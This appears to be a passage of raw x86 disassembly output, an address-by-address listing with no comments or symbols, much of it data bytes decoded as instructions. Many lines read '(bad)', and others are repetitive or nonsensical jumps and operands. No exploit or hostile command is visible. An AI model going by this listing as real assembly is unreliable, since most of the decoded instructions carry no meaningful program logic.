  44e96b:	add    ecx,DWORD PTR ds:0xd03e700
  44e971:	add    bh,ah
  44e973:	add    ecx,DWORD PTR ds:0x1bb00800
  44e979:	add    bh,ah
  44e97b:	add    ecx,DWORD PTR ds:0x3e700
	...
  44e99d:	add    BYTE PTR ds:0xd03e700,cl
  44e9a3:	add    BYTE PTR [edi],cl
  44e9a5:	mov    al,0xfb
  44e9a7:	jmp    esi
  44e9a9:	add    ecx,DWORD PTR ds:0xd03e700
  44e9af:	add    bh,ah
  44e9b1:	add    ecx,DWORD PTR ds:0xdbaecc00
  44e9b7:	jmp    esi
  44e9b9:	add    ecx,DWORD PTR ds:0xd03e700
  44e9bf:	add    bh,ah
  44e9c1:	add    ecx,DWORD PTR ds:0x3bae2500
  44e9c7:	add    bh,ah
  44e9c9:	add    ecx,DWORD PTR ds:0xd03e700
  44e9cf:	add    BYTE PTR [eax],al
  44e9d1:	jmp    0xe444e9e4
  44e9d6:	pushf  
  44e9d7:	retf   0xe8ff
  44e9da:	push   cs
  44e9db:	add    BYTE PTR [eax],al
  44e9dd:	jmp    0xe944e9f0
  44e9e2:	push   cs
  44e9e3:	add    BYTE PTR [eax],al
  44e9e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e9e6:	jl     0x44e9b2
  44e9e8:	(bad)  
  44e9e9:	call   0xe944e9fc
  44e9ee:	push   cs
  44e9ef:	add    BYTE PTR [eax],al
  44e9f1:	jmp    0x5a44ea04
  44e9f6:	pop    esp
  44e9f7:	retf   0xe8ff
  44e9fa:	push   cs
  44e9fb:	add    BYTE PTR [eax],al
  44e9fd:	jmp    0xe944ea10
	...
  44ea1e:	add    BYTE PTR [eax],al
  44ea20:	push   cs
  44ea21:	add    BYTE PTR [eax],al
  44ea23:	stos   BYTE PTR es:[edi],al
  44ea24:	stos   DWORD PTR es:[edi],eax
  44ea25:	leave  
  44ea26:	(bad)  
  44ea27:	call   0xe944ea3a
  44ea2c:	push   cs
  44ea2d:	add    BYTE PTR [eax],al
  44ea2f:	jmp    0xd144ea42
  44ea34:	stos   DWORD PTR es:[edi],eax
  44ea35:	leave  
  44ea36:	(bad)  
  44ea37:	call   0xe944ea4a
  44ea3c:	push   cs
  44ea3d:	add    BYTE PTR [eax],al
  44ea3f:	jmp    0xd944ea52
  44ea44:	imul   ecx,ecx,0xffffffff
  44ea47:	call   0xe944ea5a
  44ea4c:	push   cs
  44ea4d:	add    BYTE PTR [eax],al
  44ea4f:	jmp    0x2144ea62
  44ea54:	push   0xffffffc9
  44ea56:	(bad)  
  44ea57:	call   0xe944ea6a
  44ea5c:	push   cs
  44ea5d:	add    BYTE PTR [eax],al
  44ea5f:	jmp    0xbc44ea72
  44ea64:	ror    ecx,1
  44ea66:	(bad)  
  44ea67:	jmp    DWORD PTR [esp+edi*8-0x1]
  44ea6b:	push   DWORD PTR [esp+edi*8-0x1]
  44ea6f:	push   DWORD PTR [esp+edi*8-0x1]
  44ea73:	(bad)  
  44ea74:	jmp    0x44eab8
  44ea76:	cmp    al,BYTE PTR [eax]
  44ea78:	fs cld 
  44ea7a:	(bad)  
  44ea7b:	push   DWORD PTR [esp+edi*8]
  44ea7e:	(bad)  
  44ea7f:	push   DWORD PTR [esp+edi*8]
  44ea82:	(bad)  
  44ea83:	inc    DWORD PTR [eax]
	...
  44eaa1:	add    BYTE PTR ds:0x24003a43,bl
  44eaa7:	cld    
  44eaa8:	(bad)  
  44eaa9:	push   DWORD PTR [esp+edi*8]
  44eaac:	(bad)  
  44eaad:	push   DWORD PTR [esp+edi*8]
  44eab0:	(bad)  
  44eab1:	dec    DWORD PTR [edi+0x24003a3e]
  44eab7:	cld    
  44eab8:	(bad)  
  44eab9:	push   esp
  44eabb:	add    eax,DWORD PTR [eax]
  44eabd:	add    ah,dh
  44eabf:	add    eax,DWORD PTR [eax]
  44eac1:	add    BYTE PTR [edi-0x1bffc5bf],dl
  44eac7:	add    eax,DWORD PTR [eax]
  44eac9:	add    ah,dh
  44eacb:	add    eax,DWORD PTR [eax]
  44eacd:	add    ah,dh
  44eacf:	add    eax,DWORD PTR [eax]
  44ead1:	add    BYTE PTR [ecx+edi*4],al
  44ead4:	cmp    al,BYTE PTR [eax]
  44ead6:	in     al,0x3
  44ead8:	add    BYTE PTR [eax],al
  44eada:	mov    ah,0x3
  44eadc:	add    BYTE PTR [eax],al
  44eade:	mov    ah,0x3
  44eae0:	add    BYTE PTR [eax],al
  44eae2:	adc    al,0xb9
  44eae4:	cmp    al,BYTE PTR [eax]
  44eae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44eae7:	add    eax,DWORD PTR [eax]
  44eae9:	add    BYTE PTR [ebx+eax*1+0x3b40000],dh
  44eaf0:	add    BYTE PTR [eax],al
  44eaf2:	cmp    bh,BYTE PTR [eax+0x3a4003a]
  44eaf8:	add    BYTE PTR [eax],al
  44eafa:	je     0x44eaff
  44eafc:	add    BYTE PTR [eax],al
  44eafe:	or     eax,0xdfffc99
  44eb03:	int    0xc7
  44eb05:	cmp    eax,0x0
	...
  44eb22:	add    BYTE PTR [eax],al
  44eb24:	or     eax,0xdfffc99
  44eb29:	cdq    
  44eb2a:	cld    
  44eb2b:	dec    DWORD PTR ds:0xdfffc99
  44eb31:	mov    bl,0xc2
  44eb33:	cmp    eax,0xfffc990d
  44eb38:	or     eax,0xdfffc99
  44eb3d:	cdq    
  44eb3e:	cld    
  44eb3f:	dec    DWORD PTR ds:0xd3dc279
  44eb45:	cdq    
  44eb46:	cld    
  44eb47:	dec    DWORD PTR ds:0xdfffc99
  44eb4d:	cdq    
  44eb4e:	cld    
  44eb4f:	dec    DWORD PTR ds:0xd3dc33f
  44eb55:	cdq    
  44eb56:	cld    
  44eb57:	dec    DWORD PTR ds:0xdfffc99
  44eb5d:	cdq    
  44eb5e:	cld    
  44eb5f:	dec    DWORD PTR ds:0xd3dc146
  44eb65:	cdq    
  44eb66:	cld    
  44eb67:	dec    DWORD PTR ds:0xdfffc99
  44eb6d:	cdq    
  44eb6e:	cld    
  44eb6f:	dec    DWORD PTR ds:0xd3dc391
  44eb75:	cdq    
  44eb76:	cld    
  44eb77:	dec    DWORD PTR ds:0xdfffc99
  44eb7d:	cdq    
  44eb7e:	cld    
  44eb7f:	dec    DWORD PTR ds:0xd3dc2f7
  44eb85:	cdq    
  44eb86:	cld    
  44eb87:	inc    DWORD PTR [eax]
	...
  44eba5:	add    BYTE PTR ds:0xdfffc99,cl
  44ebab:	cdq    
  44ebac:	cld    
  44ebad:	dec    DWORD PTR ds:0xd3dc25d
  44ebb3:	add    bh,ah
  44ebb5:	add    ecx,DWORD PTR ds:0xd03e700
  44ebbb:	add    bh,ah
  44ebbd:	add    ecx,DWORD PTR ds:0x30b3dc00
  44ebc3:	add    bh,ah
  44ebc5:	add    ecx,DWORD PTR ds:0xd03e700
  44ebcb:	add    bh,ah
  44ebcd:	add    ecx,DWORD PTR ds:0x10b45500
  44ebd3:	add    bh,ah
  44ebd5:	add    ecx,DWORD PTR ds:0xd03e700
  44ebdb:	add    bh,ah
  44ebdd:	add    ecx,DWORD PTR ds:0xf0b42a00
  44ebe3:	jmp    esi
  44ebe5:	add    ecx,DWORD PTR ds:0xd03e700
  44ebeb:	add    bh,ah
  44ebed:	add    ecx,DWORD PTR ds:0xd0b2bb00
  44ebf3:	jmp    esi
  44ebf5:	add    ecx,DWORD PTR ds:0xd03e700
  44ebfb:	add    bh,ah
  44ebfd:	add    ecx,DWORD PTR ds:0x30b34900
  44ec03:	add    bh,ah
  44ec05:	add    ecx,DWORD PTR ds:0x3e700
	...
  44ec27:	add    BYTE PTR ds:0xd03e700,cl
  44ec2d:	add    bl,dl
  44ec2f:	xor    edx,DWORD PTR [ebx]
  44ec31:	add    bh,ah
  44ec33:	add    ecx,DWORD PTR ds:0xd03e700
  44ec39:	add    bh,ah
  44ec3b:	add    ecx,DWORD PTR ds:0xf3336300
  44ec41:	jmp    esi
  44ec43:	add    ecx,DWORD PTR ds:0xd03e700
  44ec49:	add    BYTE PTR [eax],al
  44ec4b:	jmp    0xa544ec5e
  44ec50:	faddp  st(5),st
  44ec52:	(bad)  
  44ec53:	call   0xe944ec66
  44ec58:	push   cs
  44ec59:	add    BYTE PTR [eax],al
  44ec5b:	jmp    0xee44ec6e
  44ec60:	aas    
  44ec61:	(bad)  
  44ec62:	(bad)  
  44ec63:	call   0xe944ec76
  44ec68:	push   cs
  44ec69:	add    BYTE PTR [eax],al
  44ec6b:	jmp    0x8f44ec7e
  44ec70:	pop    ds
  44ec71:	(bad)  
  44ec72:	(bad)  
  44ec73:	call   0xe944ec86
  44ec78:	push   cs
  44ec79:	add    BYTE PTR [eax],al
  44ec7b:	jmp    0x6c44ec8e
  44ec80:	inc    ebp
  44ec82:	(bad)  
  44ec83:	call   0xe944ec96
  44ec88:	push   cs
  44ec89:	add    BYTE PTR [eax],al
  44ec8b:	jmp    0x44ec90
	...
  44eca8:	add    BYTE PTR [eax],al
  44ecaa:	push   cs
  44ecab:	add    BYTE PTR [eax],al
  44ecad:	or     al,0xdf
  44ecaf:	(bad)  
  44ecb2:	push   cs
  44ecb3:	add    BYTE PTR [eax],al
  44ecb5:	jmp    0xe944ecc8
  44ecba:	push   cs
  44ecbb:	add    BYTE PTR [eax],al
  44ecbd:	pop    ecx
  44ecbe:	cmp    eax,esi
  44ecc0:	(bad)  
  44ecc1:	call   0xe944ecd4
  44ecc6:	push   cs
  44ecc7:	add    BYTE PTR [eax],al
  44ecc9:	jmp    0x6a44ecdc
  44ecce:	jmp    0x0:0xee8ffc2
  44ecd5:	jmp    0xe944ece8
  44ecda:	push   cs
  44ecdb:	add    BYTE PTR [eax],al
  44ecdd:	push   esp
  44ecde:	stos   BYTE PTR es:[edi],al
  44ecdf:	ret    0xffff
  44ece2:	mov    ah,0x0
  44ece4:	add    BYTE PTR [eax],al
  44ece6:	mov    ah,0x0
  44ece8:	add    BYTE PTR [eax],al
  44ecea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44eceb:	add    BYTE PTR [eax],al
  44eced:	add    BYTE PTR [eax],ah
  44ecef:	popf   
  44ecf0:	cmp    al,BYTE PTR [eax]
  44ecf2:	je     0x44ecf4
  44ecf4:	add    BYTE PTR [eax],al
  44ecf6:	je     0x44ecf8
  44ecf8:	add    BYTE PTR [eax],al
  44ecfa:	add    BYTE PTR fs:[eax],al
  44ecfd:	add    BYTE PTR ds:0x74003a98,bl
  44ed03:	add    BYTE PTR [eax],al
  44ed05:	add    BYTE PTR [eax+eax*1+0x0],dh
  44ed09:	add    BYTE PTR [eax+eax*1+0x0],ah
	...
  44ed29:	add    BYTE PTR [eax],al
  44ed2b:	add    BYTE PTR [edi+0x34003a97],dh
  44ed31:	add    BYTE PTR [eax],al
  44ed33:	add    BYTE PTR [eax+eax*1],dh
  44ed36:	add    BYTE PTR [eax],al
  44ed38:	and    al,0x0
  44ed3a:	add    BYTE PTR [eax],al
  44ed3c:	pop    es
  44ed3d:	cwde   
  44ed3e:	cmp    al,BYTE PTR [eax]
  44ed40:	xor    al,0x0
  44ed42:	add    BYTE PTR [eax],al
  44ed44:	xor    al,0x0
  44ed46:	add    BYTE PTR [eax],al
  44ed48:	and    al,0x0
  44ed4a:	add    BYTE PTR [eax],al
  44ed4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ed4d:	xchg   esi,eax
  44ed4e:	cmp    al,BYTE PTR [eax]
  44ed50:	hlt    
  44ed51:	(bad)  
  44ed52:	(bad)  
  44ed53:	push   esp
  44ed55:	(bad)  
  44ed56:	(bad)  
  44ed57:	jmp    esp
  44ed59:	(bad)  
  44ed5a:	(bad)  
  44ed5b:	dec    DWORD PTR [esi-0xbffc568]
  44ed61:	(bad)  
  44ed62:	(bad)  
  44ed63:	push   esp
  44ed65:	(bad)  
  44ed66:	(bad)  
  44ed67:	jmp    esp
  44ed69:	(bad)  
  44ed6a:	(bad)  
  44ed6b:	push   DWORD PTR [esi-0x68]
  44ed6e:	cmp    al,BYTE PTR [eax]
  44ed70:	mov    ah,0xff
  44ed72:	(bad)  
  44ed73:	push   DWORD PTR [edi+edi*8-0x66f20001]
  44ed7a:	cld    
  44ed7b:	dec    DWORD PTR ds:0xd3de774
  44ed81:	cdq    
  44ed82:	cld    
  44ed83:	dec    DWORD PTR ds:0xdfffc99
  44ed89:	cdq    
  44ed8a:	cld    
  44ed8b:	dec    DWORD PTR ds:0x3e411b
	...
  44edad:	add    BYTE PTR ds:0xdfffc99,cl
  44edb3:	cdq    
  44edb4:	cld    
  44edb5:	dec    DWORD PTR ds:0xdfffc99
  44edbb:	ret    0x3e47
  44edbe:	or     eax,0xdfffc99
  44edc3:	cdq    
  44edc4:	cld    
  44edc5:	dec    DWORD PTR ds:0xdfffc99
  44edcb:	pop    ebp
  44edcc:	dec    edi
  44edcd:	aas    
  44edce:	or     eax,0xdfffc99
  44edd3:	cdq    
  44edd4:	cld    
  44edd5:	dec    DWORD PTR ds:0xdfffc99
  44eddb:	and    eax,0x990d3e98
  44ede0:	cld    
  44ede1:	dec    DWORD PTR ds:0xdfffc99
  44ede7:	cdq    
  44ede8:	cld    
  44ede9:	dec    DWORD PTR ds:0xd3e97e2
  44edef:	cdq    
  44edf0:	cld    
  44edf1:	dec    DWORD PTR ds:0xdfffc99
  44edf7:	cdq    
  44edf8:	cld    
  44edf9:	dec    DWORD PTR ds:0xd3e0092
  44edff:	cdq    
  44ee00:	cld    
  44ee01:	dec    DWORD PTR ds:0xdfffc99
  44ee07:	cdq    
  44ee08:	cld    
  44ee09:	dec    DWORD PTR ds:0xd3e8ab7
  44ee0f:	add    bh,ah
  44ee11:	add    eax,DWORD PTR [eax]
	...
  44ee2f:	add    BYTE PTR ds:0xd03e700,cl
  44ee35:	add    bh,ah
  44ee37:	add    ecx,DWORD PTR ds:0xeb049f00
  44ee3d:	jmp    esi
  44ee3f:	add    ecx,DWORD PTR ds:0xd03e700
  44ee45:	add    BYTE PTR [ebx-0x72002f16],bl
  44ee4b:	jmp    0xffcd:0xc130048
  44ee52:	out    0x18,al
  44ee54:	int    0xff
  44ee56:	or     cl,BYTE PTR [ecx*8-0x32e5b101]
  44ee5d:	inc    DWORD PTR [esi]
  44ee5f:	or     al,0xcd
  44ee61:	(bad)  
  44ee62:	fimul  WORD PTR [ebx]
  44ee64:	int    0xff
  44ee66:	(bad)  
  44ee67:	or     ecx,ebp
  44ee69:	(bad)  
  44ee6a:	fimul  WORD PTR [ebx]
  44ee6c:	int    0xff
  44ee6e:	out    0xb,al
  44ee70:	int    0xff
  44ee72:	push   ds
  44ee73:	sbb    ebp,ecx
  44ee75:	call   DWORD PTR [esi]
  44ee77:	sbb    ebp,ecx
  44ee79:	(bad)  
  44ee7a:	(bad)  
  44ee7b:	sbb    ch,cl
  44ee7d:	jmp    DWORD PTR [edx]
  44ee7f:	sbb    ebp,ecx
  44ee81:	call   DWORD PTR [esi]
  44ee83:	sbb    ebp,ecx
  44ee85:	call   FWORD PTR [esi]
  44ee87:	sbb    ebp,ecx
  44ee89:	jmp    DWORD PTR [esi]
  44ee8b:	sbb    DWORD PTR [ebp+0x0],ecx
  44ee8e:	lahf   
  44ee8f:	sbb    BYTE PTR [ebp+0x0],cl
  44ee92:	mov    ebx,DWORD PTR [eax]
	...
  44eeb0:	add    BYTE PTR [eax],al
  44eeb2:	dec    ebp
  44eeb3:	add    BYTE PTR [edi+0x6f004d18],al
  44eeb9:	sbb    BYTE PTR [ebp+0x0],cl
  44eebc:	jae    0x44eed6
  44eebe:	dec    ebp
  44eebf:	add    BYTE PTR [ebx+0x18],ah
  44eec2:	dec    ebp
  44eec3:	add    BYTE PTR [eax],al
  44eec5:	xor    esp,esi
  44eec7:	aas    
  44eec8:	add    BYTE PTR ds:0xd004024,bh
  44eece:	and    al,0x40
  44eed0:	add    BYTE PTR ds:0xe9004014,bh
  44eed6:	push   cs
  44eed7:	add    BYTE PTR [eax],al
  44eed9:	scas   al,BYTE PTR es:[edi]
  44eeda:	ds stc 
  44eedc:	xchg   esi,eax
  44eedd:	in     eax,0x8c
  44eedf:	sar    edi,0xe8
  44eee2:	push   cs
  44eee3:	add    BYTE PTR [eax],al
  44eee5:	jmp    0xe944eef8
  44eeea:	push   cs
  44eeeb:	add    BYTE PTR [eax],al
  44eeed:	jmp    0xe944ef00
  44eef2:	push   cs
  44eef3:	add    BYTE PTR [eax],al
  44eef5:	jmp    0xe944ef08
  44eefa:	push   cs
  44eefb:	add    BYTE PTR [eax],al
  44eefd:	jmp    0xe944ef10
  44ef02:	push   cs
  44ef03:	add    BYTE PTR [eax],al
  44ef05:	jmp    0xe944ef18
  44ef0a:	push   cs
  44ef0b:	add    BYTE PTR [eax],al
  44ef0d:	jmp    0xe944ef20
  44ef12:	push   cs
  44ef13:	add    BYTE PTR [eax],al
  44ef15:	jmp    0x44ef1a
	...
  44ef32:	add    BYTE PTR [eax],al
  44ef34:	ds cmp eax,0xeed
  44ef3b:	jno    0x44ef94
  44ef3d:	ins    DWORD PTR es:[edi],dx
  44ef3e:	ss dec ecx
  44ef40:	inc    edi
  44ef41:	push   ebp
  44ef42:	xor    DWORD PTR ss:[edi-0x43],eax
  44ef46:	ss sbb edi,edx
  44ef49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ef4a:	ss rcl eax,1
  44ef4d:	mov    WORD PTR [esi],?
  44ef4f:	jmp    0xfd44efa2
  44ef54:	push   cs
  44ef55:	add    BYTE PTR [eax],al
  44ef57:	cmc    
  44ef58:	fsubr  st,st(0)
  44ef5a:	cmp    DWORD PTR [eax],eax
  44ef5c:	push   0x7c3f98b1
  44ef61:	mov    al,0xa4
  44ef63:	aas    
  44ef64:	in     al,0xcc
  44ef66:	(bad)  
  44ef67:	push   eax
  44ef69:	sti    
  44ef6a:	(bad)  
  44ef6b:	call   eax
  44ef6d:	lods   al,BYTE PTR ds:[esi]
  44ef6e:	and    BYTE PTR [eax],dh
  44ef70:	loopne 0x44ef1e
  44ef72:	cmp    BYTE PTR [eax],dh
  44ef74:	call   0x10754024
  44ef79:	lods   al,BYTE PTR ds:[esi]
  44ef7a:	ins    BYTE PTR es:[edi],dx
  44ef7b:	xor    BYTE PTR [eax],cl
  44ef7d:	lods   al,BYTE PTR ds:[esi]
  44ef7e:	jl     0x44efb0
  44ef80:	sub    BYTE PTR [esp+ecx*4-0x6353c7d0],ch
  44ef87:	xor    BYTE PTR [eax-0x54],cl
  44ef8a:	lods   al,BYTE PTR ds:[esi]
  44ef8b:	xor    BYTE PTR [eax+0x2830bcab],ch
  44ef91:	lods   al,BYTE PTR ds:[esi]
  44ef92:	int3   
  44ef93:	xor    BYTE PTR [eax],bh
  44ef95:	lods   al,BYTE PTR ds:[esi]
  44ef96:	fdiv   QWORD PTR [eax]
	...
  44efb4:	add    BYTE PTR [eax],al
  44efb6:	sub    BYTE PTR [esp+ebp*8-0x35437d0],ch
  44efbd:	xor    BYTE PTR [eax-0x55],ch
  44efc0:	or     al,0x31
  44efc2:	cmp    BYTE PTR [ebx-0x23cb0008],ch
  44efc8:	(bad)  
  44efc9:	(bad)  
  44efca:	mov    esp,0x30fffffa
  44efcf:	lods   al,BYTE PTR ds:[esi]
  44efd0:	add    al,0x30
  44efd2:	xor    BYTE PTR [esp+edx*1+0x24ac5030],ch
  44efd9:	xor    BYTE PTR [eax-0x54],ah
  44efdc:	xor    al,0x30
  44efde:	jo     0x44ef8c
  44efe0:	inc    esp
  44efe1:	xor    BYTE PTR [eax-0x54],dh
  44efe4:	push   esp
  44efe5:	xor    BYTE PTR [eax+0x60306453],dl
  44efeb:	push   esp
  44efec:	je     0x44f01e
  44efee:	jo     0x44f043
  44eff0:	test   BYTE PTR [eax],dh
  44eff2:	or     eax,0x1d9bccfd
  44eff7:	test   esp,ecx
  44eff9:	stos   DWORD PTR es:[edi],eax
  44effa:	sbb    eax,0x1dbbccfd
  44efff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f000:	int3   
  44f001:	retf   
  44f002:	sbb    eax,0xfddbcc9d
  44f007:	inc    esp
  44f008:	int3   
  44f009:	jmp    0x44f008
  44f00b:	pushf  
  44f00c:	int3   
  44f00d:	sti    
  44f00e:	std    
  44f00f:	ror    DWORD PTR fs:[ebx],cl
  44f012:	cld    
  44f013:	jl     0x44efe8
  44f015:	sbb    ebx,esp
  44f017:	inc    esp
  44f018:	shr    DWORD PTR [ebx],cl
	...
  44f036:	add    BYTE PTR [eax],al
  44f038:	fdivr  QWORD PTR [ebx+edx*8-0x2cdb23c5]
  44f03f:	dec    ebx
  44f040:	fcomp  QWORD PTR [ebx+edx*8]
  44f043:	pop    ebx
  44f044:	cmp    al,0x5
  44f046:	shr    DWORD PTR [ebx+0x3c],cl
  44f049:	pop    ebp
  44f04a:	sar    DWORD PTR [ebx+0x3c],cl
  44f04d:	in     eax,0xd3
  44f04f:	mov    edi,DWORD PTR [edi*8-0x7ae3642d]
  44f056:	shr    DWORD PTR [ebx-0x442c02e4],cl
  44f05c:	sbb    al,0x25
  44f05e:	aam    0xcb
  44f060:	sbb    al,0x1d
  44f062:	aam    0xdb
  44f064:	cld    
  44f065:	(bad)  
  44f066:	shr    ebx,cl
  44f068:	cld    
  44f069:	sbb    al,0xd4
  44f06b:	sti    
  44f06c:	cld    
  44f06d:	fs into 
  44f06f:	or     edi,edi
  44f071:	jl     0x44f041
  44f073:	sbb    ebx,edi
  44f075:	inc    esp
  44f076:	into   
  44f077:	sub    ebx,edi
  44f079:	mov    esp,0xa4df3bce
  44f07e:	into   
  44f07f:	dec    ebx
  44f080:	fistp  WORD PTR [esi+ecx*8-0x317ac0a5]
  44f087:	imul   edi,DWORD PTR [edi],0x0
  44f08a:	pop    ebx
  44f08b:	shl    BYTE PTR [esi+0x32],cl
  44f08e:	arpl   dx,dx
  44f090:	xchg   BYTE PTR [ecx],dh
  44f092:	jnp    0x44f066
  44f094:	xchg   BYTE PTR [ecx],dh
  44f096:	adc    edx,0xffffffb6
  44f099:	xor    DWORD PTR [ebx-0x2e],edi
	...
  44f0b8:	add    BYTE PTR [eax],al
  44f0ba:	xchg   esi,eax
  44f0bb:	xor    DWORD PTR [ebx-0x64ce392e],esp
  44f0c1:	shl    dh,cl
  44f0c3:	xor    ebx,eax
  44f0c5:	shl    BYTE PTR [esi-0x492d64cf],cl
  44f0cb:	xor    ebx,esp
  44f0cd:	rol    BYTE PTR [esi],1
  44f0cf:	xor    edi,ebx
  44f0d1:	rol    BYTE PTR [esi],1
  44f0d3:	xor    eax,ebx
  44f0d5:	shl    dh,1
  44f0d7:	xor    bh,BYTE PTR [ebx+0x2332d6d0]
  44f0dd:	rol    DWORD PTR [esi+0x33],1
  44f0e0:	sbb    edx,ecx
  44f0e2:	out    0x32,al
  44f0e4:	add    edx,ecx
  44f0e6:	div    BYTE PTR [edx]
  44f0e8:	fcmovnbe st,st(0)
  44f0ea:	div    BYTE PTR [edx]
  44f0ec:	arpl   cx,dx
  44f0ee:	xchg   BYTE PTR [edx],dh
  44f0f0:	jnp    0x44f0c3
  44f0f2:	xchg   BYTE PTR [edx],dh
  44f0f4:	adc    ecx,0xffffffb6
  44f0f7:	xor    bh,BYTE PTR [ebx-0x2f]
  44f0fa:	xchg   esi,eax
  44f0fb:	xor    ah,BYTE PTR [ebx]
  44f0fd:	rol    DWORD PTR [esi+0x32],1
  44f100:	sbb    edx,ecx
  44f102:	data16 xor al,BYTE PTR [ebx-0x2f]
  44f106:	xor    bl,BYTE PTR ss:[ebx]
  44f109:	shl    DWORD PTR [esi],1
  44f10b:	xor    ah,bl
  44f10d:	xlat   BYTE PTR ds:[ebx]
  44f10e:	push   es
  44f10f:	xor    al,0xfb
  44f111:	xlat   BYTE PTR ds:[ebx]
  44f112:	push   es
  44f113:	xor    al,0xc3
  44f115:	xlat   BYTE PTR ds:[ebx]
  44f116:	div    BYTE PTR [ebx]
  44f118:	mov    ebx,0xa333d6d7
  44f11d:	xlat   BYTE PTR ds:[ebx]
	...
  44f13a:	add    BYTE PTR [eax],al
  44f13c:	(bad)  
  44f13d:	xor    eax,DWORD PTR [eax]
  44f13f:	popf   
  44f140:	loop   0x44f11b
  44f142:	xor    eax,DWORD PTR [ebp+0x5d33e9da]
  44f148:	aad    0xf9
  44f14a:	xor    esp,DWORD PTR [ebp-0x26]
  44f14d:	mov    DWORD PTR [ebx],esi
  44f14f:	jge    0x44f113
  44f151:	cdq    
  44f152:	xor    eax,DWORD PTR [ebp+0x7d33a9ba]
  44f158:	ret    0x33b9
  44f15b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f15c:	mov    edx,0xe29d3349
  44f161:	pop    ecx
  44f162:	xor    eax,ebp
  44f164:	fisubr DWORD PTR [ecx+0x33]
  44f167:	popf   
  44f168:	loop   0x44f1e3
  44f16a:	xor    esp,ebp
  44f16c:	fisttp DWORD PTR [ecx]
  44f16e:	xor    edi,ebp
  44f170:	ret    
  44f171:	sbb    DWORD PTR [ebx],esi
  44f173:	lds    edi,FWORD PTR [ebx-0x3c42ccd7]
  44f179:	cmp    DWORD PTR [ebx],esi
  44f17b:	and    eax,0x1d32c9ba
  44f180:	(bad)  
  44f181:	fnstenv [edx]
  44f183:	add    eax,0xdd32e95a
  44f188:	arpl   cx,di
  44f18a:	xor    ah,BYTE PTR [ebp+0x5b]
  44f18d:	mov    DWORD PTR [edx],esi
  44f18f:	jge    0x44f1d4
  44f191:	cdq    
  44f192:	xor    al,BYTE PTR [ebp+0x7d32a93b]
  44f198:	inc    ebx
  44f199:	mov    ecx,0x493b2532
  44f19e:	xor    bl,BYTE PTR ds:0x0
	...
  44f1bc:	add    BYTE PTR [eax],al
  44f1be:	arpl   WORD PTR [ecx+0x32],bx
  44f1c1:	inc    ebp
  44f1c2:	pop    ebx
  44f1c3:	imul   esi,DWORD PTR [edx],0x3279631d
  44f1c9:	jmp    0x8144f1ec
  44f1ce:	push   cs
  44f1cf:	add    BYTE PTR [eax],al
  44f1d1:	dec    ecx
  44f1d2:	cmp    eax,0xbc002ca1
  44f1d7:	dec    edi
  44f1d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44f1d9:	xor    edx,esp
  44f1db:	dec    edi
  44f1dc:	lods   al,BYTE PTR ds:[esi]
  44f1dd:	xor    edi,DWORD PTR [eax+edx*2]
  44f1e0:	mov    ah,0x33
  44f1e2:	xor    al,0x50
  44f1e4:	mov    esp,0xc454bc33
  44f1e9:	xor    edx,DWORD PTR [eax]
  44f1eb:	push   eax
  44f1ec:	cmp    BYTE PTR [eax+edi*1],dh
  44f1ef:	push   eax
  44f1f0:	les    esi,FWORD PTR ds:0x35cc4ea4
  44f1f6:	aam    0x4e
  44f1f8:	sub    al,0x36
  44f1fa:	or     al,0x52
  44f1fc:	xor    al,0x36
  44f1fe:	xchg   esp,eax
  44f1ff:	push   ecx
  44f200:	pushf  
  44f201:	mov    WORD PTR ss:[ecx-0x5c],ss
  44f205:	ss push esp
  44f207:	push   edx
  44f208:	lods   al,BYTE PTR ds:[esi]
  44f209:	ss sub al,0x52
  44f20c:	mov    ah,0x36
  44f20e:	je     0x44f261
  44f210:	mov    esp,0x5050d836
  44f215:	aaa    
  44f216:	xor    BYTE PTR [eax+ebx*4+0x38],cl
  44f21a:	dec    eax
  44f21b:	dec    esp
  44f21c:	clc    
  44f21d:	cmp    BYTE PTR [eax+0x4b],bh
  44f220:	add    BYTE PTR [ecx],bh
	...
  44f23e:	add    BYTE PTR [eax],al
  44f240:	pusha  
  44f241:	dec    ebx
  44f242:	or     BYTE PTR [ecx],bh
  44f244:	js     0x44f291
  44f246:	adc    BYTE PTR [ecx],bh
  44f248:	jo     0x44f295
  44f24a:	sbb    BYTE PTR [ecx],bh
  44f24c:	sbb    BYTE PTR [ebx+0x20],cl
  44f24f:	cmp    DWORD PTR [eax+eax*4-0x8],esi
  44f253:	(bad)  
  44f254:	in     al,dx
  44f255:	add    eax,DWORD PTR [eax]
  44f257:	add    BYTE PTR [ebp+ecx*2-0x5c],bh
  44f25b:	cmp    al,ah
  44f25d:	dec    ebp
  44f25e:	lods   al,BYTE PTR ds:[esi]
  44f25f:	cmp    bh,BYTE PTR [ebp+ecx*2+0x4de43ab4]
  44f266:	mov    esp,0xc44dfc3a
  44f26b:	cmp    cl,BYTE PTR ds:0xe7d3ca37
  44f271:	cs retf 0xd7db
  44f275:	push   es
  44f276:	retf   0xd7e3
  44f279:	push   cs
  44f27a:	retf   0x47eb
  44f27d:	jns    0x44f249
  44f27f:	repz inc edi
  44f281:	jno    0x44f24d
  44f283:	sti    
  44f284:	aaa    
  44f285:	jne    0x44f250
  44f287:	(bad)  
  44f289:	jne    0x44f254
  44f28b:	pop    ss
  44f28c:	es jne 0x44f258
  44f28f:	pop    ds
  44f290:	es add eax,0x151627c9
  44f296:	leave  
  44f297:	das    
  44f298:	push   ss
  44f299:	jne    0x44f264
  44f29b:	aaa    
  44f29c:	push   es
  44f29d:	jne    0x44f268
  44f29f:	aas    
  44f2a0:	push   es
  44f2a1:	and    eax,0x47c9
	...
  44f2c2:	test   ah,0xc9
  44f2c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44f2c6:	test   ah,0xc9
  44f2c9:	scas   eax,DWORD PTR es:[edi]
  44f2ca:	out    0x80,al
  44f2cc:	leave  
  44f2cd:	pop    edi
  44f2ce:	loope  0x44f2d4
  44f2d0:	enter  0xd967,0x14
  44f2d4:	enter  0xd17f,0xf0
  44f2d8:	ror    BYTE PTR [ebx-0x6c3f26b7],0x41
  44f2df:	rol    eax,1
  44f2e1:	fwait
